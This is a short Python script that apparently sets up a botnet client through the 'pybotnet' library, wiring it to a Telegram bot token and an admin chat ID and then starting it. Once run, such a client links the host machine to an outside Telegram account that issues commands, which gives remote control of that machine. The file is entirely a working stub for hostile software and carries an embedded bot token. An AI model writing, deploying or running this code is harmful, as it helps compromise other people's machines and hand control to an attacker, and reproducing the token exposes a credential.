from pybotnet import BotNet,TelegramEngine

telegram_engine = TelegramEngine(token="5986172966:AAHTLBf4VDaB8b1Bbx_ZZnc0_IPmwS5N0mM", admin_chat_id="5671962308")


botnet = BotNet(telegram_engine) # 

botnet.run()